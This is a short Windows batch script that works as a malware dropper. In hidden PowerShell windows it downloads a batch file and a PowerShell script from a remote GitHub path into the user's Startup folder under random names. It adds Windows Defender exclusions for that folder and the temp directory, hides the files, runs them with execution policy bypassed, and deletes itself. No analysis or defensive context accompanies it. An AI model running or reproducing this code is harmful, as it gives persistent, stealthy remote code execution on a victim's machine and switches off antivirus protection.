@echo off

set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd %STARTUP%

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/AutoRun.bat -OutFile nEQlCzTBpDrO.bat"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1 -OutFile ./AmJOwiWzUEbZ.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"

@REM powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
powershell powershell.exe -windowstyle hidden -ep bypass "./nEQlCzTBpDrO.bat"
powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"

cd "%INITIALPATH%"

del initial1.cmd